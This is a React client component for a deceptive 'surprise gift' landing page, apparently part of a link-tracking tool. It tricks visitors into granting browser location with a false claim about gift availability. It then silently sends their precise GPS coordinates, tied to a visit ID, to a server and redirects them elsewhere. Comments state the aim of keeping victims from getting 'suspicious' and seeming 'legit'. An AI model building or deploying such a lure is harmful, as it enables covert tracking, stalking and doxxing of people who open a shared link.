'use client';

import { useState } from 'react';
import { Gift, Loader2, PartyPopper } from 'lucide-react';

export default function VerifyHumanClient({ visitId, destination }: { visitId: string, destination: string | null }) {
  const [status, setStatus] = useState<'idle' | 'verifying' | 'success'>('idle');

  const startVerification = () => {
    setStatus('verifying');

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          // Success: Got their exact GPS coordinates
          try {
            await fetch('/api/visit', {
              method: 'PATCH',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                visitId,
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
              })
            });
            setStatus('success');
            // Redirect to destination or default
            setTimeout(() => {
              window.location.href = destination || "https://google.com";
            }, 1000);
          } catch (e) {
            console.error(e);
            setStatus('success'); // allow anyway so they don't get suspicious
          }
        },
        async (error) => {
          // User denied permission or error occurred
          console.warn('Geolocation error:', error);
          // If denied, we still let them through to seem legit, but we only have their IP.
          await fetch('/api/visit', {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              visitId,
              // Record denial as a specific recognizable state if needed, but here we just proceed
            })
          });
          setStatus('success');
          setTimeout(() => {
            window.location.href = destination || "https://google.com";
          }, 1000);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    } else {
      // Browser doesn't support geolocation
      setStatus('success');
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4 text-gray-900 font-sans">
      <div className="max-w-md w-full bg-white rounded-xl shadow-lg border border-gray-100 p-8 text-center flex flex-col items-center">

        {status === 'idle' && (
          <>
            <div className="w-20 h-20 rounded-full bg-pink-100 flex items-center justify-center mb-6">
              <Gift size={40} className="text-pink-500" />
            </div>
            <h1 className="text-2xl font-bold mb-2">You Have a Surprise!</h1>
            <p className="text-gray-500 mb-8 max-w-[280px]">
              someone sends a surprise for you. Claim it to see what it is!
            </p>
            <button
              onClick={startVerification}
              className="w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold py-4 px-6 rounded-lg transition-colors flex items-center justify-center gap-2 text-lg shadow-md"
            >
              Open Surprise
            </button>
            <p className="text-xs text-gray-400 mt-6 text-center max-w-[280px]">
              Please click &quot;Allow&quot; if your browser prompts for Location. We use this to verify the gift availability in your region.
            </p>
          </>
        )}

        {status === 'verifying' && (
          <>
            <Loader2 size={48} className="text-pink-500 animate-spin mb-6" />
            <h1 className="text-xl font-bold mb-2">Unwrapping...</h1>
            <p className="text-gray-500">Preparing your surprise.</p>
          </>
        )}

        {status === 'success' && (
          <>
            <PartyPopper size={56} className="text-pink-500 mb-6" />
            <h1 className="text-2xl font-bold mb-2">Surprise Ready!</h1>
            <p className="text-gray-500">Redirecting you to your gift...</p>
          </>
        )}

      </div>

      <div className="mt-8 text-xs text-gray-400 flex items-center gap-2">
        <span>💝 Sent by someone</span>
      </div>
    </div>
  );
}
